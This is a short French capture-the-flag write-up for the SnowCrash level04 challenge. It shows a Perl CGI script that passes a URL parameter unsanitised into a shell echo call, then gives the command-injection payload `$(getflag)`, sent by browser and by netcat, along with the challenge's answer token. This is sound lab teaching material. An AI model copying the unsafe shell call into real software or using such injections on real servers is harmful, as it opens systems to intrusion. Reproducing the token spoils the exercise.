# Level04 - Script Perl
Pour résoudre le level04, on nous fournis un fichier `level04.pl`. Ce fichier démarre un serveur web sur le port 4747 de la VM. En regardant le programme, on peut voir qu'il prend un argument `x` et va echo ce qu'on lui envoie en valeur.
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

On peut de ce fait injecter une commande dans l'argument, qui va être exécutée pendant l'appel à echo.

On peut le faire directement depuis le navigateur, ou en utilisant `netcat`:

```
192.168.56.102:4747?x=$(getflag)
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
ou
```
level04@SnowCrash:~$ nc localhost 4747
GET ?x=$(getflag)
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

On a notre token: `ne2searoevaevoem4ov4ar8ap`

